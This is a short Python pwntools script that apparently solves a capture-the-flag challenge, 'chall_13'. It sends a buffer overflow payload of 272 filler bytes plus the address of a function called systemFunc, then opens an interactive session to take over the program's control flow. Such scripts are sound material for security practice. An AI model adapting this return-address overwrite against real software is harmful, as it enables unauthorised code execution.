# coding: utf-8
def chall13():
    p = process("./chall_13")
    elf = ELF("./chall_13")
    p.recv()
    payload = (b"a"*272 + p32(elf.sym.systemFunc))
    p.sendline(payload)
    p.interactive()
    
    
chall13()
